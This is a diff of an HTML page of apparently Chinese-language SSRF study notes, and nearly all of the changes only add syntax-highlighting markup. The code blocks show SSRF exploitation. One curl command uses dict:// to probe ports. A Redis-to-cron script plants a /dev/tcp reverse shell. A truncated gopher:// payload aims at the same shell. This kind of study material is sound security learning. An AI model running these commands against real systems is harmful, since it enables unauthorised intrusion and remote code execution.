@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2023-02-02 Thu 21:55 -->
+<!-- 2023-02-15 Wed 22:05 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>SSRF</title>
@@ -187,16 +187,16 @@ curl_close($ch); //关闭 cURL 资源，并且释放系统资源
 </pre>
 </div>
 <div class="org-src-container">
-<pre class="src src-html">&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;post.php&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;?php
+<pre class="src src-html"><span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">html</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">head</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+    <span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">title</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>post.php<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">title</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">head</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;</span><span style="color: #006FE0;">body</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+    <span style="color: #333333; background-color: #FFFFFF;">&lt;</span>?php
     echo $_REQUEST[cmd];
-    ?&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+    ?<span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">body</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
+<span style="color: #333333; background-color: #FFFFFF;">&lt;/</span><span style="color: #006FE0;">html</span><span style="color: #333333; background-color: #FFFFFF;">&gt;</span>
 </pre>
 </div>
 
@@ -204,7 +204,7 @@ curl_close($ch); //关闭 cURL 资源，并且释放系统资源
 <a href="20220708-network_protocol.html#ID-6d4b32fe-0963-4fd0-9e79-a09905dced7b">dict</a> 探测端口：
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">curl -v -H 'host:one.php.local' 'http://127.0.0.1:8080/ssrf.php?url=dict://127.0.0.1:22'
+<pre class="src src-bash"><span style="color: #006DAF;">curl</span> <span style="color: #D0372D;">-v</span> <span style="color: #D0372D;">-H</span> <span style="color: #008000;">'host:one.php.local'</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=dict://127.0.0.1:22'</span>
 </pre>
 </div>
 <p>
@@ -216,12 +216,12 @@ Invalid SSH identification string.
 exp(linux):
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">echo -e "\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1\n\n\n"|redis-cli -h $1 -p $2 -x set 1
-redis-cli -h $1 -p $2 config set dir /var/spool/cron/
-redis-cli -h $1 -p $2 config set dbfilename root
-redis-cli -h $1 -p $2 save
-redis-cli -h $1 -p $2 quit
-bash shell.sh 127.0.0.1 6379
+<pre class="src src-bash"><span style="color: #006FE0;">echo</span> <span style="color: #D0372D;">-e</span> <span style="color: #008000;">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1\n\n\n"</span><span style="color: #0000FF;">|</span><span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> <span style="color: #D0372D;">-x</span> set <span style="color: #D0372D;">1</span>
+<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> config set dir /var/spool/cron/
+<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> config set dbfilename root
+<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> save
+<span style="color: #006DAF;">redis-cli</span> <span style="color: #D0372D;">-h</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">1</span> <span style="color: #D0372D;">-p</span> <span style="color: #0000FF;">$</span><span style="color: #D0372D; font-style: italic;">2</span> quit
+<span style="color: #006DAF;">bash</span> shell.sh 127.0.0.1 <span style="color: #D0372D;">6379</span>
 </pre>
 </div>
 
@@ -237,7 +237,7 @@ bash shell.sh 127.0.0.1 6379
 再利用 <a href="20220708-network_protocol.html#ID-a58133b5-ab13-4e15-992a-dcdd8b5c0fd2">gopher</a> 协议 payload<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup> 反弹 shell:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">curl -v 'http://127.0.0.1:8080/ssrf.php?url=gopher://127.0.0.1:6379/_*...' -H 'host: one.php.local'
+<pre class="src src-bash"><span style="color: #006DAF;">curl</span> <span style="color: #D0372D;">-v</span> <span style="color: #008000;">'http://127.0.0.1:8080/ssrf.php?url=gopher://127.0.0.1:6379/_*...'</span> <span style="color: #D0372D;">-H</span> <span style="color: #008000;">'host: one.php.local'</span>
 </pre>
 </div>
 </div>
